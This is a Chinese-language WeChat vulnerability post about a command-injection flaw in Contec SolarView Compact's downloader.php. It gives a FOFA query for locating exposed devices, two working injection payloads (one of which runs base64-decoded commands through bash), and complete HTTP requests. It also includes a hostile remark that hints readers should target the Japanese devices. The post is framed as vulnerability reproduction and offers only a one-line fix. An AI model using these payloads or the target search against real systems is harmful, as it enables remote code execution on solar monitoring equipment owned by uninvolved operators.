<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/v9kMkicrqy2JUFNtLUPquA)

**漏洞说明**

Contec SolarView Compact 是日本 Contec 公司的一个应用系统，提供光伏发电测量系统。SolarView Compact 6.00 以下存在命令注入漏洞，攻击者可以通过 downloader.php 绕过内部限制执行命令。

攻击者可通过该漏洞在服务器端任意执行代码，获取服务器权限。

**影响版本**

```
SolarView Compact <= 6.00

```

**漏洞复现**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbUnL0zFvR4QWdwiceV4aVmJjK0BpvkAFvjFXSKVHMV6CeGWNErCHJcLwpHkibg3mLnicafwSOmchYYUQ/640?wx_fmt=png)

```
fofa:body="SolarView Compact" && title="Top"

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbUnL0zFvR4QWdwiceV4aVmJjjovPEk7dL7UYWaxZv2hHcwhtP4xYPADxQbtcMqBNB6Kg7QymrLcqNw/640?wx_fmt=png)

全是小日.... 子过的不错的日本小国的设备。懂得都懂，该照顾的就照顾

payload:  

```
/downloader.php?file=%3B{cmd}|rev%00.zip

```

```
GET /downloader.php?file=%3Bid|rev%00.zip HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36
Connection: close
Accept-Encoding: gzip, deflate

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbUnL0zFvR4QWdwiceV4aVmJjwqibG5cjlOiaeNsicTFPGK5kPVIj1t39l0Ab8k3Bk73FuwXzNxqorOzSg/640?wx_fmt=png)

可以看见输出是倒输出的，tools 有位大佬发帖说明 base64 编码后命令输出就正常了。

https://www.t00ls.com/thread-69596-1-1.html

payload：  

```
/downloader.php?file=;echo%20{base64-cmd}|base64%20-d|bash%00.zip

```

```
GET /downloader.php?file=;echo%20{bas64-cmd}|base64%20-d|bash%00.zip HTTP/1.1
Host: ip:port
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/y0627QbVVbUnL0zFvR4QWdwiceV4aVmJjiar3bSAAawhyHHe7PlxwkwKSJ26ZGGicdqJxfkhY85GBwzY8mQG4dV3w/640?wx_fmt=png)

**修复建议**

升级至安全版本

本文章仅用于学习交流，不得用于非法用途

星标加关注，追洞不迷路